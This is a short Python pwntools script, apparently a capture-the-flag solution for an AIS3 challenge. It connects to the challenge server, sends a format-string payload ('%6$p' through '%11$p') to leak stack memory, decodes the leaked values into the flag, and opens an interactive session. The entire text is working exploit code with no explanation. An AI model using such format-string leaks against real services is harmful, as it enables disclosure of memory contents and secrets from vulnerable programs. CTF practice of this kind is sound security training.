from pwn import *

r = remote('mf-pwn.ais3.org', 10101)

payload = ''
for i in range(6, 12):
    payload += f'%{i}$p'

r.sendlineafter('Say hello to the stack :D\n', payload)
out = r.recvline().decode('utf-8')

flag = b''
for i in out.split('0x')[1:]:
    flag += p64(int(i, 16))

print(flag)

r.interactive()
